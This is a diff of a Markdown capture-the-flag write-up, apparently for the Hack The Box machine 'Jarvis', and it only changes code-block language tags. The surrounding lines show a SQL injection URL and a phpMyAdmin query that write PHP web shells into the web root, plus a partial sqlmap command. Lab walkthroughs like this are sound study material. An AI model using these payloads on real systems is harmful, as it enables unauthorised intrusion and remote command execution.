@@ -300,7 +300,7 @@ mysql> select "text" INTO OUTFILE "file.txt"
 ```
 One big drawback of this command is that it can be appended to an existing query using the **UNION SQL** token.
 #### Manually
-```console
+```url
 http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,"<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/alo.php-- -
 ```
 I then navigate to cmd.php and also create listener on local machine:
@@ -316,6 +316,6 @@ sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent --os-
 ```
 #### phpMyAdmin
 From the SQL console we can write a web shell:
-```console
+```sql
 SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/html/sh3ll.php"
 ```
